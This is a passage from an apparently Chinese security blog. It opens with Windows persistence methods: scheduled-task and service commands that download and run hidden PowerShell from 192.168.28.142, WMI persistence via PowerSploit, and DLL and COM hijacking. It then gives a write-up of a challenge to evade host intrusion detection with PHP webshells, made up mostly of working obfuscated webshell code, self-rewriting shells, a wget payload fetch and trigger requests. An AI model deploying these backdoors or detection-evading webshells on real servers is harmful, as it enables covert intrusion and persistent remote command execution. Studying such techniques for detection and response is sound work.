组策略设置脚本启动**\n\n运行gpedit.msc进入本地组策略，通过Windows设置的“脚本(启动/关机)”项来说实现。因为其极具隐蔽性，因此常常被攻击者利用来做服务器后门。\n\n![image-20250803162843397](应急响应-windows篇/image-20250803162843397.png)\n\n容易遇到的问题：脚本需全路径，如`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe `\n\n**0x03 计划任务**\n\n通过window系统的任务计划程序功能实现定时启动某个任务，执行某个脚本。\n\n使用以下命令可以一键实现：\n\n~~~\nschtasks /create /sc minute /mo 1 /tn \"Security Script\" /tr \"powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring(\\\"\\\"\\\"http://192.168.28.142:8888/logo.gif\\\"\\\"\\\"))\\\"\"\n~~~\n\n容易遇到的问题：cmd命令行执行单引号会被替换成双引号，故这里使用三个双引号替代。\n\n计划脚本每 1 分钟运行一次。\n\n![image-20250803163021640](应急响应-windows篇/image-20250803163021640.png)\n\n**0x04 服务自启动**\n\n通过服务设置自启动，结合powershell实现无文件后门。\n\n使用以下命令可实现：\n\n~~~\nsc create \"KeyName\" binpath= \"cmd /c start powershell.exe -nop -w hidden -c \\\"IEX ((new-object net.webclient).downloadstring('http://192.168.28.142:8888/logo.gif'))\\\"\"\n\nsc description  KeyName \"Just For Test\"   //设置服务的描述字符串\nsc config Name start= auto                //设置这个服务为自动启动\nnet start Name                            //启动服务\n~~~\n\n成功创建了一个自启动服务\n\n![image-20250803163202145](应急响应-windows篇/image-20250803163202145.png)\n\n**0x05 WMI后门**\n\n在2015年的blackhat大会上Matt Graeber介绍了一种无文件后门就是用的WMI。这里可以利用一个工具powersploit，下面用它的Persistence模块来示范一个简单的例子。\n\n~~~\nImport-Module .\\Persistence\\Persistence.psm1\n$ElevatedOptions = New-ElevatedPersistenceOption -PermanentWMI -Daily -At '3 PM'\n$UserOptions = New-UserPersistenceOption -Registry -AtLogon\nAdd-Persistence -FilePath .\\EvilPayload.ps1 -ElevatedPersistenceOption $ElevatedOptions -UserPersistenceOption $UserOptions -Verbose\n~~~\n\n**0x06 dll劫持**\n\n如果在进程尝试加载一个DLL时没有指定DLL的绝对路径，那么Windows会尝试去指定的目录下查找这个DLL；如果攻击者能够控制其中的某一 个目录，并且放一个恶意的DLL文件到这个目录下，这个恶意的DLL便会被进程所加载，从而造成代码执行。\n\n比较常用的如LPK.dll的劫持：\n\nwin7及win7以上系统增加了KnownDLLs保护，需要在注册表：\n\n```\nHKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager\\ExcludeFromKnownDlls\n```\n\n下添加 “lpk.dll” 才能顺利劫持：\n\n![image-20250803163815495](应急响应-windows篇/image-20250803163815495.png)\n\n**0x07 COM劫持**\n\n利用COM劫持技术，最为关键的是dll的实现以及CLSID的选择，通过修改CLSID下的注册表键值，实现对CAccPropServicesClass和MMDeviceEnumerator劫持，而系统很多正常程序启动时需要调用这两个实例。这种方法可以绕过Autoruns对启动项的检测。\n\n","tags":["应急响应"],"categories":["web安全"]},{"title":"HIDS PHP Webshell Bypass 研究分析","url":"/2025/07/30/HIDS-PHP-Webshell-Bypass-研究分析/","content":"\n背景：2022年春天，参加了某HIDS Bypass挑战赛，赛题恰好是关于PHP WebShell绕 过的，结合Fuzz技术获得了几个侥幸可以绕过的样本，围绕#WebShell检测那些事的主题， 与各位做一个分享。 \n\n<!--more-->\n\n挑战赛规则如下:  \n\n1、WebShell 指外部能传参控制(如通过 GET/POST/HTTP Header 头等方式)执行任 意代码 或命令，比如 eval($_GET[1]);。在文件写固定指令不算 Shell，被认定为无 效，如<?php system(‘whoami’); \n\n2、绕过检测引擎的 WebShell 样本，需要同时提供完整有效的 curl 利用方式， 如:curl ‘http://127.0.0.1/webshell.php?1=system(\"whoami\")';。curl 利用方式可以在 提供的 docker 镜像中进行编写测试，地址可以是容器 IP 或者 127.0.0.1，文件名 任意，以执行 whoami 作为命令示例。  \n\n3、WebShell 必须具备通用性，审核时会拉取提交的 WebShell 内容，选取一个和 验证镜 像相同的环境进行验证，如果不能正常运行，则认为无效。\n\n4、审核验证 payload 有效性时，WebShell 文件名会随机化，不能一次性执行成功 和稳定 触发的，被认定为无效。\n\n\n\n首先，我对查杀引擎进行了一定的猜测，根据介绍查杀引擎有两个，两个引擎同 时工作，只要有一个引擎检测出了 WebShell 返回结果就是查杀，根据经验推测，应 该是有一个静态的，另一个是动态的。对于静态引擎的绕过，可以通过拆分关键词、 加入能够引发解析干扰的畸形字符等;而对于动态引擎，需要分析它跟踪了哪些输入 点，又是如何跟踪变量的，最终是在哪些函数的哪些参数命中了恶意样本规则，于是 我开始了一些尝试。 \n\n\n\n### 0x01 CURL 引入参数\n\n经过分析，引擎对$_GET $_POST $_COOKIE $_REQUEST $_FILES $_SERVER $GLOBALS  等几乎一切可以传递用户参数的全局变量都进行了过滤，但是对 curl 进来的内容却是没有 任何过滤，于是我们可以通过CURL引入参数。\n\n\n\n```\n<?php \n$url=\"http://x/1.txt\"; \n$ch = curl_init(); \ncurl_setopt($ch, CURLOPT_URL, $url); \ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); \ncurl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); \ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); \ncurl_setopt($ch,CURLOPT_HTTPHEADER,$headerArray); \n$output = curl_exec($ch); \ncurl_close($ch); \necho $output; \neval($output);\n```\n\n但是在这一点的评判上存在争议，本样本惨遭忽略。根据挑战赛规则，能够动态引入参 数即可，我个人认为CURL引入的参数也属于外部可控的参数内容。 \n\n### 0x02 get_meta_tags 引入参数\n\nget_meta_tags 函数会对给定 url 的 meta 标签进行解析，自然也会发起URL请求。对 于能够发起外连的服务器来说，这个PHP WebShell样本是极具迷惑性的。 \n\n不过，之前CURL的被忽略了，这个我也就没有再提交。\n\n```\n<?php \nget_meta_tags(\"http://x/1\")[\"author\"](get_meta_tags(\"http://x/1\")[\"\n keywords\"]); \n?>\n```\n\n此时，目标服务器上需要有相应的文件配合：\n\n```\n<meta name=\"author\" content=\"system\"> \n<meta name=\"keywords\" content=\"ls\">\n```\n\n这个name 我们可以随便指定，相应的我们的payload也要做相应的修改\n\n\n\n这里的payload 就相当于`get_meta_tags(\"http://x/1\")[\"author\"]` 先用这个取到了 `system` \n\n在用 `get_meta_tags(\"http://x/1\")[\" keywords\"]`  取到了 `ls` 然后执行后的结果\n\n![image-20250730125511333](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730125511333.png)\n\n我们尝试一下写shellcode\n\n我们尝试用 `echo 123>/tmp/123.php` 去写入发现 他并没有 写入成功，网页直接输出了123\n\n这里我尝试对`echo 123>/tmp/123.php` 进行base64编码，然后在我们的payload进行一下解码\n\n```\nget_meta_tags(\"http://192.168.197.134/demo1.html\")[\"author\"](base64_decode(get_meta_tags(\"http://192.168.197.134/demo1.html\")[\"keywords\"]));\n\n<meta name=\"author\" content=\"passthru\">  //这里的执行函数，可以换多种，如system等 \n<meta name=\"keywords\" content=\"ZWNobyAxMjM+L3RtcC8xMjMucGhw\"> \n```\n\n成功写入 shell\n\n\n\n`passthru` 这个函数也可以执行命令，挺少见的，也许某些地方可以绕过\n\n我们换个思路进行写shellcode，我们可以从我们的服务器上直接wget下来\n\n\n\n```\nwget -O /tmp/shell.php http://192.168.197.134/shell.txt\n```\n\n这样也是可以实现的，但是要注意的是你wget的文件必须是txt等他获得请求后的结果 作为的内容进行传入的php\n\n，不然直接请求php可能会返回空\n\n\n\n### 0x03 fpm_get_status 引入参数\n\n因为当时的比赛是php-fpm的架构，而`fpm_get_status` 可以获取到fpm的一些状态\n\n我们需要找到这些用户可以控制的状态参数\n\n```\n<?php \necho \"<pre>\";\nvar_dump(fpm_get_status()); \n```\n\n先用这个打印一下\n\n![image-20250730150759807](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730150759807.png)\n\n注意到这里他可以接收get的传参\n\n那么我们就可以进行拼接\n\n```\n<?php \necho \"<pre>\";\nvar_dump(fpm_get_status()); \nsystem(fpm_get_status()[\"procs\"][0][\"query-string\"]);\n```\n\n![image-20250730151013484](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730151013484.png)\n\n这么一个逻辑\n\n```\nsystem(fpm_get_status()[\"procs\"][0][\"query-string\"]);\n```\n\n所以我们通过这个完全可以取出来\n\n![image-20250730163151987](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730163151987.png)\n\n没问题\n\n有些时候 procs 的第一个 不是 0 这个数组，所以\n\n```\n<?php \nforeach(fpm_get_status()[\"procs\"] as $val){ \nsystem($val[\"query-string\"]); \n}\n```\n\n这样就可以每次都触发，做了一个循环，肯定能取到0\n\n### 0x04 递归GLOBALS 引入参数\n\n经过测试，查杀引擎对$GLOBALS 全局变量传参点进行了检测，但是似乎没有严格执行 递归，通过一些变形即可绕过：\n\n```\n<?php \n$m=($GLOBALS[\"GLOBALS\"][\"GLOBALS\"][\"GLOBALS\"][\"GLOBALS\"][\"GLOBALS\"][\"GLOBALS\"][\"_GET\"][\"b\"]); \nsubstr(timezone_version_get(),2)($m);\n```\n\n由于静态引擎会直接拦截system( ，所以，进行了一些包装，timezone_version_get() 在给定的测试环境中返回的值恰好是：0.system 。  关于这一点，我在PHP 网站上看到了这样一段话： \n\nIf you get 0.system for the version, this means you have the version that PHP shipped  with. For a newer version, you must upgrade via the PECL extension (sudo pecl install  timezonedb)\n\n传参数入口方面，我暂时就发现了这么多，接下来，我试图通过特殊的变量传递方式切 断动态查杀引擎的污点跟踪链。 \n\n\n\n这里我们自己分析一下\n\n先打印看一下 $GLOBALS 到底是什么\n\n![image-20250730233350866](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730233350866.png)\n\n可以看到\n\n*RECURSION* 是递归的意思，也就是下面有很多个GLOPBALS 嵌套的数组，有可能他的追踪链不会追这么深，污点断掉，我们的payload就可以绕过\n\n`timezone_version_get()` 然后我们查一下这个函数，到底是什么\n\n![image-20250730233943209](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730233943209.png)\n\n他这获取一个版本，好像并不是我所想象的执行命令的函数\n\n我们打印一下看一下\n\n\n\n![image-20250730234054976](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730234054976.png)\n\nsystem出现了，后面查资料发现，timezonedb  只要这个的版本不是最新的，他就会返回 0.system \n\n仅限于Linux系统，windows系统不行\n\n![image-20250730234256844](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730234256844.png)\n\n后面拼接get传参就可以执行命令\n\n![image-20250730234313033](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730234313033.png)\n\n在测试一下post\n\n![image-20250730234346318](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730234346318.png)\n\npost也可以传\n\n也可以执行\n\n### 0x05 模式一： Array元素引用\n\n```\n<?php \n$b = \"111\"; \n$c = \"222\"; \nif(get_cfg_var('error_reporting')>0){ \n    $b=\"#\"; \n} \n$a = array( \"one\"=>$c,\"two\"=>&$c ); \n$url = \"http://a/usr/\".$b.\"?a=1\"; \n$d =parse_url($url); \nif($d['query']){ \n    $c=\"echo 111;\"; \n} \nelse{ \n    $c=$_FILES['useraccount']['name']; \n} \n \nvar_dump($a[\"two\"]); \neval($a[\"two\"]); \n?>\n```\n\n这里先分析一下代码\n\n第一个if判断通过`get_cfg_var` 判断`error_reporting` 模式是否开启\n\n如果开启 `$b=\"#\"`\n\n![image-20250730235626827](HIDS-PHP-Webshell-Bypass-研究分析/image-20250730235626827.png)\n\n这里打印了一下，发现我们的环境是开启了这个模式的\n\n`$a = array( \"one\"=>$c,\"two\"=>&$c );` \n\n又引入了一个变量a ，\"one\"=>$c 这里是值赋值，将变量`$c`的当前值复制到数组的`\"one\"`键中。如果后续`$c`的值发生变化，数组中的这个值不会受到影响，\"two\"=>&$c 这里是引用赋值， 将变量`$c`的引用（而非值）赋给数组的`\"two\"`键。这意味着数组中的这个元素会始终反映`$c`的当前值，反之亦然 —— 如果通过数组修改这个元素，`$c`的值也会改变，也就是他们两现在共用一个内存地址\n\n`$url = \"http://a/usr/\".$b.\"?a=1\";`\n\n`$d =parse_url($url);` \n\n 然后这里他把$b 进行拼接在了这个url地址栏中\n\n并用$d 来接收了url解析后的一些参数，我们可以打印看一下，正常的url有哪些参数\n\n![image-20250731000005008](HIDS-PHP-Webshell-Bypass-研究分析/image-20250731000005008.png)\n\n\n\n正常也就是$b 是111的时候，他有query这个字段\n\n我们在试试把#进行拼接呢？\n\n![image-20250731000059292](HIDS-PHP-Webshell-Bypass-研究分析/image-20250731000059292.png)\n\n发现他这里query字段消失了，导致下面的那个if判断走的分支就不一样了\n\n```\nif($d['query']){ \n\n  $c=\"echo 111;\"; \n\n} \n\nelse{ \n\n  $c=$_FILES['useraccount']['name']; \n\n} \n```\n\n这里就被我们上面控制，如果有query 那么就是为真，$c=\"echo 111;\" 最后我们输出的那个two 就是111，为正常的参数，waf不会拦截\n\n但是如果 query 为 假，也就是 $b=\"#\"，`$c=$_FILES['useraccount']['name'];`  这个看上去像文件上传的参数\n\n且用户可控\n\n这里其实就是利用了 waf，和服务器的配置的差异性，因为waf他要保证精简，所以一般这些他不会用的服务都会关闭，我们服务器呢，这个配置默认就是开启的，waf他走正常的输出逻辑，过掉之后，服务器在运行，又走另一个分支，从而实现了我们的绕过\n\n我们复现一下，具体怎么个用户可控\n\n首先我们需要抓一个文件上传的包，还有正常访问的包，将文件上传的post部分，覆盖进get访问的包\n\n![image-20250731002142552](HIDS-PHP-Webshell-Bypass-研究分析/image-20250731002142552.png)\n\n上传文件的内容随便，我们只需要控制他的name\n\n成功执行\n\n### 0x06 模式二： 反序列化引用\n\n怎么能少得了反序列化呢？记得在N年前php4fun挑战赛challenge8中，一道与L.N. 师傅有关的题令我印象深刻，其中使用的技术正是PHP反序列化引用。 \n\n```\n<?php \n$s= unserialize('a:2:{i:0;O:8:\"stdClass\":1:{s:1:\"a\";i:1;}i:1;r:2;}'); \n$c = \"123\"; \n$arr= get_declared_classes(); \n$i=0; \nfor($i;$i<count($arr);$i++){ \n$i++; \n$s[1]->a=$_GET['a']; \nif($i<97 || $i>=98){ \ncontinue; \n} \n$c=$s[0]->a; \n    print(substr(get_declared_classes()[72],4,6)($c)); \n} \n?>\n```\n\n分析\n\n他先将`a:2:{i:0;O:8:\"stdClass\":1:{s:1:\"a\";i:1;}i:1;r:2;}` 进行了一下反序列化，我们看一下打印一下看看反序列化的结果\n\n![image-20250804110743785](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804110743785.png)\n\n也可以直接读序列化的值\n\n他这里定义了一个对象a，然后里面有两个元素，第一个是int型，值是0，第二个又是一个对象 长度8，名称stdClass，属性1，里面第一个元素 str类型，长度1，key=a，int型， value=1， 第二个元素 int型长度1，\n\nr:2 是对a对象的第二个元素的引用 也就是我们反序列化后的结果打印出来的\n\n两个都指向stdClass 这个元素\n\n![image-20250804111430369](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804111430369.png)\n\n\n\n打印看一下定义了哪些数组，包含自定义的数组\n\n![image-20250804111535354](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804111535354.png)\n\n可以看到这里的第\n\n这里我们在打印一下他有多少个数组\n\n![image-20250804111912136](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804111912136.png)\n\n145 刚好能满足在下面 到97的时候 会继续执行下面的代码\n\n`$s[1]->a=$_GET['a'];`  这里他将 get请求获取的值 赋值给数组s的第二个元素，也就是刚刚的r:2 \n\n又进行引用，指向了s[0]，这样也具有一定的迷惑性迷惑waf\n\n`$c=$s[0]->a;`  下面有将 s[0] 赋值给a ，然后赋值给c\n\n最后的命令执行 参数也就是$c\n\n\n\n![image-20250804113122051](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804113122051.png)\n\n刚刚这里 我们还需要注意 他最后命令执行的函数也就是通过\n\nsubstr(get_declared_classes()[72],4,6)\n\n这里我们需要修改为我们环境的 70\n\n刚好截取出来的是system，然后进行拼接执行函数\n\n![image-20250804113334426](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804113334426.png)\n\n成功执行\n\n### 0x07 trait\n\n在对前两种模式Fuzz的同时，我发现了一个新的思路，这个思路虽然同样部分依赖于 系统环境变量，但是由于执行函数和传参都进行了变形，可以有效阻断污点追踪技术。\n\n```\n<?php \ntrait system{ \n \n} \n$a= new OverflowException($_GET['a']); \n \n \n$c = \"123\"; \n$arr= getmygid(); \n$i=0; \nfor($i;$i<$arr;$i++){ \n    $i++; \n    if($i<33 || $i>=34){ \n        continue; \n    } \n \n    $c=$a->getMessage(); \n    get_declared_traits()[0]($c); \n \n}\n```\n\n分析\n\n他先用trait 定义了一个类，trait这个是php中为了完善定义类的方式新增了可复用类\n\n如\n\n```\n<?php\ntrait Hello {\n    public function sayHello() {\n        echo 'Hello ';\n    }\n}\n\ntrait World {\n    public function sayWorld() {\n        echo 'World';\n    }\n}\n\nclass MyHelloWorld {\n    use Hello, World;\n    public function sayExclamationMark() {\n        echo '!';\n    }\n}\n\n$o = new MyHelloWorld();\n$o->sayHello();\n$o->sayWorld();\n$o->sayExclamationMark();\n?>\n```\n\n然后他 new了一个对象 通过OverflowException这个默认的类创建\n\n抛出异常的一个类，\n\n我们可以去官方文档看一下他有哪些属性和方法\n\n![image-20250804120056516](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804120056516.png)\n\n这里可以看到我们传入了 一个get传参，第一个参数就是message，进行了赋值\n\n且后面也调用了getmessage() ，进行赋值给$c\n\n然后这里他还将 $arr 通过getmygid() 获得文件的所属组的id，进行赋值给$arr，\n\n然后去进行了if判断，在33 的时候正好 能继续执行下面的代码，而且我们可以看一下\n\n/etc/passwd，下面的 www-data 的组id是多少\n\n![image-20250804120451533](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804120451533.png)\n\n可以看到这个是33，也就是可以成功执行下面的代码\n\n最后执行 get_declared_traits()[0]\n\n这个方法\n\n![image-20250804120611473](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804120611473.png)\n\n可以看到 他的返回值是 已经定义的 所有 traits 的名称的数组，这里我们只定义了一个\n\n所以就可以把system 取出来\n\n最后也是拼接执行的代码\n\n测试\n\n![image-20250804120735694](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804120735694.png)\n\n成功\n\n然后这里这个异常的类有很多，都可以进行替换，一般的抛出异常肯定是有抛出异常信息这个的方法和属性的，\n\n为什么能绕过呢？\n\n这里我如此初始化：$a= new JsonException($_GET['a']); 于是，分别从危险函数和 用户传参两个路径来狙击动态跟踪，发生了新的绕过。除了JsonException以外，我发现  引擎对内置接口的getMessage 普遍不敏感，这样的内置类大致（未严格测试，其中可能 会有些类不支持getMessage方法）如下： \n\n```\n  Error \n      ArithmeticError \n        DivisionByZeroError \n      AssertionError \n      ParseError \n      TypeError \n        ArgumentCountError \n    Exception \n      ClosedGeneratorException \n      DOMException \n      ErrorException \n      IntlException \n      LogicException \n        BadFunctionCallException \n          BadMethodCallException \n        DomainException \n        InvalidArgumentException \n        LengthException \n        OutOfRangeException \n      PharException \n      ReflectionException \n      RuntimeException \n        OutOfBoundsException \n        OverflowException \n        PDOException \n        RangeException \n        UnderflowException \n        UnexpectedValueException \n      SodiumException\n```\n\n### 0x08 SESSION \n\n如果动态引擎去检查，他应该没有SESSION，至少是在第一次的时候。\n\n\n\n```\n<?php \n \n$b = \"111\"; \n$c = \"222\"; \nsession_start(); \n$_SESSION['a']=\"#\"; \n \n$a = array( \"one\"=>$c,\"two\"=>&$c ); \n$url = \"http://a/usr/\".$_SESSION['a'].\"?a=1\"; \n$d =parse_url($url); \n \nif($d['query']){ \n \n    $c=\"echo 111;\"; \n \n} \nelse{ \n    $c=$_FILES['useraccount']['name']; \n} \n \n \nvar_dump($a[\"two\"]); \neval($a[\"two\"]); \n \n?> \n```\n\n 模式基本上是与之前相同的，不同之处在于引入了SESSION变量来干扰URL解析，不 知为何，这样一次就通过了检测。其实更加高级的方法应该是这样的：\n\n```\n<?php \n \n$b = \"111\"; \n$c = \"222\"; \nsession_start(); \n \n$a = array( \"one\"=>$c,\"two\"=>&$c ); \n$url = \"http://a/usr/\".$_SESSION['a'].\"?a=1\"; \n$d =parse_url($url); \n \nif($d['query']){ \n \n    $c=\"echo 111;\"; \n \n} \nelse{ \n    $c=$_FILES['useraccount']['name']; \n} \n \n \nvar_dump($a[\"two\"]); \neval($a[\"two\"]); \n \n$_SESSION['a']=\"#\"; \n \n?>\n```\n\n由于规则需要一次性执行成功，因此需要在文件末尾加入：\n\n```\nif ($_SESSION['a']!=\"#\"){ \n    $_SESSION['a']=\"#\"; \n    print(1); \n    include(get_included_files()[0]); \n} \n```\n\n触发该WebShell的HTTP请求为： \n\n```\nPOST /x.php HTTP/1.1 \nHost: x \nContent-Type: multipart/form-data;boundary=a; \nContent-Length: 101 \nCookie: PHPSESSID=bkukterqhtt79mrso0p6ogpqtm; \n --a \nContent-Disposition: form-data; name=\"useraccount\"; filename=\"phpinfo();\" \n \nphpinfo(); \n --a--\n```\n\n这个方法其实也跟前面的 0x05是差不多的，利用的是 waf和服务器的差异性，这里我们就不做过多的分析了\n\n### 0x09 SESSION扩展\n\n利用SessionHandlerInterface 扩展的接口可以神不知鬼不觉地执行特定函数，直 接看代码：\n\n```\n<?php \nini_set(\"display_errors\",1); \nclass MySessionHandler implements SessionHandlerInterface \n{ \n    // implement interfaces here \n    public function close() \n    { \n        // TODO: Implement close() method. \n    } \n \n    public function destroy($id) \n    { \n        // TODO: Implement destroy() method. \n    } \n \n    public function gc($max_lifetime) \n    { \n        // TODO: Implement gc() method. \n    } \n \n    public function open($path, $name) \n    { \n        $path($name); \n \n    } \n \n    public function read($id) \n    { \n        // TODO: Implement read() method. \n    } \n \n    public function write($id, $data) \n    { \n        // TODO: Implement write() method. \n    } \n} \n \n$handler = new MySessionHandler(); \nsession_set_save_handler($handler, true); \nsession_name($_GET['a']); \nsession_save_path('system'); \nsession_start();\n```\n\n这里我们可以看到，他自建了一个SessionHandlerInterface，并重写了里面的方法进行了覆盖，也就是说\n\n我们后面开启session_start() 的时候，会调用我们自己写的 方法，而不是系统自带的\n\n![image-20250804121645979](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804121645979.png)\n\n这是他系统自带的属性和方法，因为我们进行覆盖，可以不写下面具体的方法，只需要有这个方法名，他才不会报错，这里感觉跟之前做的dll劫持导出表有相似之处\n\n这里我们是在open下做的代码执行，其实也可以在其他地方，但是他需要接收两个用户可控的地方\n\n目前感觉只有 open 和write 可以\n\n因为我们知道 sessionid是用户可控的，data 就是我们要写入的数据 ，可以测试一下\n\n感觉不太像，这个data 他是序列化后的结果 ，无法 构造出我们想要的\n\n\n\n所以还是只有open可以实现，因为path，和name 我们可以直接传入\n\n\n\n![image-20250804122727273](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804122727273.png)\n\n没问题成功执行了\n\n### 0x0A 内存\n\n之前有考虑过写入文件后include，但是被规则禁止了，即便是include session文件也 不行，于是，想到了内存。\n\n```\n<?php \n$a = new SplTempFileObject(1000000);\n$a->fwrite( $_GET['a']); \n$a->rewind(); \nsubstr(get_declared_classes()[70],4,6)($a->fgets()); \n?> \n```\n\n\n\n这里他用SplTempFileObject 这个类创建了a这个对象，我们知道 php中，创建对象的时候\n\n会自动调用__construct这个魔术方法执行\n\n![image-20250804132219798](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804132219798.png)\n\n\n\n![image-20250804132235224](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804132235224.png)\n\n\n\n那就明白了，他这个给maxMemory 设置了大概1M 的大小，然后通过fwrite进行写入文件 给$a\n\n然后又将指针移动向文件的开头，substr(get_declared_classes()[70],4,6) 构造system，之前讲个这个构造\n\n，然后在通过$a->fgets()，读命令执行\n\n测试\n\n![image-20250804133847219](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804133847219.png)\n\n这里为什么要设置1M ，目的是为了不让他在我们执行命令的过程中生成临时文件，绕过waf\n\n只要是2M一下都行\n\n### 0x0B 修改自身\n\n修改自身的洞都被认定为同一种绕过手法了，而且已经有人先提交，因此被忽略了，但 是仍然写出来供大家参考。\n\n```\n<?php \n$s=\"Declaring file object\\n\"; \n$d=$_SERVER['DOCUMENT_ROOT'].$_SERVER['DOCUMENT_URI']; \n$file = new SplFileObject($d,'w'); \n \n$file->fwrite(\"<?php\".\" eva\".$s[3]); \n$file->fwrite(\"(\\$_\".\"GET\".\"[a]);?>\"); \n \ninclude(get_included_files()[0]); \n?>\n```\n\n分析\n\n先定义了一个$s = \"Declaring file object\\n\"\n\n然后通过$_SERVER['DOCUMENT_ROOT'].$_SERVER['DOCUMENT_URI']拼接了一个字符串，我们打印看一下是什么，\n\n![image-20250804134545321](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804134545321.png)\n\n我们可以看到 $_SERVER 中是一个数组，然后 DOCUMENT_ROOT 是服务器网站的根目录，DOCUMENT_URI是文件的路径，拼接起来就是 /var/www/html/baypass/demo11.php，就拿到了我们php的绝对路径\n\n我还发现 ，SCRIPT_FILENAME 这个也可以直接拿到文件的绝对路径，用拼接的方式也可能是为了迷惑waf\n\n![image-20250804134843626](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804134843626.png)\n\n这几个其实都能用来利，\n\n然后他 又通过SplFileObject这个类new了一个对象为$file 参数为 自己文件的绝对路径，mode是w\n\n\n\n![image-20250804135151433](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804135151433.png)\n\n我们可以看到 他正好第一个参数，第二个参数就是 文件名和mode，其他的都有默认值\n\n`$file->fwrite(\"<?php\".\" eval(\\$s[3]);\");` \n\n`$file->fwrite(\"(\\$_\".\"GET\".\"[a]);?>\");` \n\n然后他通过fwrite进行写文件\n\n这里其实我有一个疑问，他这里为什么是追加不是覆盖呢？\n\n查找资料发现\n\n因为我们 new对象的时候mode用的是w\n\n`'w'`模式的特性是：\n\n- 打开文件时会**清空原有内容**（首次写入前文件已被截断）\n- 但写入过程中，文件指针会**自动向后移动**，新的写入操作会从当前指针位置继续，形成连续追加\n\n**fwrite () 的指针移动机制**\n每次调用`fwrite()`后，文件指针会自动移动到**写入内容的末尾**。因此：\n\n- 第一次`fwrite()`写入`\"<?php\".\" eva\".$s[3]\"`\n- 指针移动到这段内容的末尾\n- 第二次`fwrite()`从当前指针位置继续写入`\"(\\$_GET[a]);?>\"`\n- 最终两个字符串会被拼接在一起，形成完整内容：<?php eval($_GET[a]);?>\n\n这里要避免$ 符被正确识别，所以要用\\进行转义\n\n也就是说我们写完后的指针在末尾!!!\n\n最后用  get_included_files 进行获取 文件的路径\n\n![image-20250804135949567](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804135949567.png)\n\n这里我们也打印一下看看他是什么\n\n![image-20250804140040813](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804140040813.png)\n\n发现这里他只有一个元素也就是我们的文件名\n\n测试执行一下\n\n\n\n![image-20250804140337782](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804140337782.png)\n\n发现自身的文件成功被修改为 我们想要的payload\n\n直接的文件读写函数被禁止了，因此需要通过SplFileObject来写，由于需要一次性执行 和稳定触发，写入之后需要自己include自己。这种WebShell很有趣，就像是披着羊皮的 狼，上传的时候看起来平平无奇，被执行一次以后就完全变了模样。  沿用这个思路，还有一个点是可以写文件的：\n\n```\n<?php \nini_set(\"display_errors\",1); \nprint \"Declaring file object\\n\"; \n$f=__FILE__; \n$file = new SplFileObject($f,'w'); \n \n$a=array(\"<?php /*\", \"*/eva\",\"(\\$_GET[a]);\"); \n$file->fputcsv($a,'l'); \n \n$file=null; \n \ninclude(get_included_files()[0]); \n \n?>\n```\n\n这个代码主要的方法就是写函数不一样 fputcsv\n\n查查官方文档\n\n![image-20250804163635726](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804163635726.png)\n\n`putcsv($a,'l');`  这里我们传入$a是我们的payload ，也就是我们传入的这个数组，然后用l 来进行分割，也就是将逗号替换为了l，但是这里有两个逗号，正常替换是<?php l eval (\\$_GET[a]);这里会多一个l所以我们用\n\n/* */ 进行注释\n\n测试\n\n![image-20250804164041643](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804164041643.png)\n\n成功变为了我们想要的，只是多了一个双引号，但是并不影响我们执行\n\n![image-20250804164125480](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804164125480.png)\n\n不同之处在于，这里使用的是fputcsv，此时，需要将写入文件以后所产生的分隔符进 行注释，因此在构造payload时需要花点心思。   更进一步，使用这个方法加载缓存也是可以的：\n\n```\n<?php \nini_set(\"display_errors\",1); \n$s=\"Declaring file objecT\\n\"; \n \n$file = new SplTempFileObject(); \n \n$file->fputcsv(explode('m',\"evam(\\$_GET[m]);\"),'l'); \n \n$file->rewind(); \neval($file->fgets()); \n \n?>\n```\n\n分析\n\n他先创建了一个对象 用SplTempFileObject这个类\n\n然后用这个类里面的方法来写payload\n\n![image-20250804164409628](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804164409628.png)\n\n用法跟前面的差不多，先用 explode m 来分割 evam(\\$_GET[m]); ，\n\n分割后变成了 eva (\\$_GET[   ]);\n\n![image-20250804164818967](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804164818967.png)\n\n这样我们能就有一个3个元素的数组，然后他又用fputcsv   l，来进行分割(代替逗号)\n\n变为了： eval($_GET[l])；所以我们传参的值是l\n\n然后他重置了一下指针到开头，然后在用eval来执行文件内容\n\n![image-20250804165113938](HIDS-PHP-Webshell-Bypass-研究分析/image-20250804165113938.png)\n\n没问题\n\n### 0x0C 